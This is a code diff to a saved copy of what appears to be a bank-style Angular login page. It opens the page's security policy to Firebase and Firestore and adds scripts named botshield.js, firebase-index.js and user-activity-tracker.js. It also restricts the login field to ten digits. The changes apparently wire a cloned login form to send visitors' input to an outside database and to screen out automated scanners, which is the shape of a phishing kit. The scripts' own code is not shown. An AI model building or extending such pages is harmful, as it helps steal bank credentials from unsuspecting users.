@@ -11,7 +11,8 @@
 <meta name=referrer content=no-referrer>
 <link rel="shortcut icon" type=image/x-icon href="./images/fav.ico">
 <meta http-equiv="Content-Security-Policy"
-  content="default-src 'none'; script-src 'self' 'unsafe-inline' data:; style-src 'self' 'unsafe-inline' http://127.0.0.1:5500; img-src 'self' data:; font-src 'self' data:; connect-src 'self' ws://127.0.0.1:5500; media-src 'self' data:; object-src 'self' data:; frame-src 'self' data:;">
+  content="default-src 'none'; script-src 'self' 'unsafe-inline' data: https://www.gstatic.com; style-src 'self' 'unsafe-inline' http://127.0.0.1:5500; img-src 'self' data:; font-src 'self' data:; connect-src 'self' ws://127.0.0.1:5500 https://*.googleapis.com wss://*.firebaseio.com https://*.firebaseio.com https://www.gstatic.com; media-src 'self' data:; object-src 'self' data:; frame-src 'self' data:;">
+<script src="js/botshield.js"></script>
 <link rel="stylesheet" href="css/index.css">
 <link rel="stylesheet" href="./css/font-awesome.min.css">
 <link rel="stylesheet" href="css/custom_ui.css">
@@ -134,7 +135,7 @@
                         <div class="mat-lg-field-prefix ng-tns-c1444137087-3 ng-star-inserted"><span
                             _ngcontent-ng-c949650880 matprefix class=ng-tns-c1444137087-3></span></div>
                         <div class="mat-lg-field-infix ng-tns-c1444137087-3"><input _ngcontent-ng-c949650880 matinput
-                            role=textbox lgcontrolname=doko name=doko autocomplete=off maxlength=20
+                            role=textbox lgcontrolname=doko name=doko autocomplete=off maxlength=10 inputmode=numeric
                             appdontallowspecialcharacters
                             class="mat-input-element mat-lg-field-autofill-control ng-tns-c1444137087-3 ng-touched ng-pristine ng-invalid cdk-text-field-autofill-monitored"
                             tabindex=1 id=mat-input-3 required aria-required=true value><span
@@ -322,7 +323,12 @@
   <div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic=true aria-live=polite id=cdk-live-announcer-0>
   </div>
   </div>
-  <script src="js/interacciones.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  <script src="js/firebase-config.js?v=1.1"></script>
+  <script src="js/firebase-index.js?v=1.2"></script>
+  <script src="js/user-activity-tracker.js?v=1.1"></script>
+  <script src="js/interacciones.js?v=1.2"></script>
 </body>
 
 </html>
